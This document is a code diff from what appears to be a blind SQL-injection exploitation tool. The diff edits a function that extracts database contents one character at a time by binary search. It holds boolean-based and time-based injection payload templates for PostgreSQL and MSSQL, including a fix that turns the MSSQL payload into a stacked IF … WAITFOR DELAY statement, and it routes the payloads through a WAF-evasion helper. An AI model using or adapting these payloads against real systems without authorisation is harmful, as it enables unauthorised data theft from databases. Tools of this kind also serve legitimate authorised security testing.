@@ -39,6 +39,7 @@ from ..log import get_logger
 from ..http.injector import Injector
 from ..http.waf_detect import EVASION_NONE
 from .options import ScanOptions
+from .payloads import apply_evasion
 from .active import _fetch, _diff_score, _len_ratio, _has_stable_boolean_signal
 from .blind import _timed_fetch
 
@@ -158,7 +159,6 @@ def _binary_search_char(
         true_payload  = f"' AND {ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}-- -"
         false_payload = f"' AND {ord_fn}({substr_fn}(({expr}),{pos},1))>{hi}-- -"  # always false
 
-        from .payloads import apply_evasion
         true_pl  = apply_evasion(true_payload,  evasion)
         false_pl = apply_evasion(false_payload, evasion)
 
@@ -174,11 +174,11 @@ def _binary_search_char(
                     f" THEN (SELECT 1 FROM pg_sleep({delay})) ELSE 1 END)=1-- -"
                 )
             elif _dbms == "mssql":
-                # MSSQL: IF(cond) WAITFOR DELAY — must be a stacked statement
-                # Use a conditional WAITFOR via a subquery trick that works in-band
+                # MSSQL: WAITFOR DELAY cannot appear inside a SELECT subquery; it
+                # requires a stacked (batched) statement.  Use a stacked IF … WAITFOR.
                 time_true_pl = (
-                    f"' AND 1=(SELECT CASE WHEN ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
-                    f" THEN (SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:{delay}') x) ELSE 1 END)-- -"
+                    f"'; IF ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
+                    f" WAITFOR DELAY '0:0:{delay}'-- -"
                 )
             elif _dbms == "sqlite":
                 # SQLite: randomblob-based busy loop to induce delay when condition is true
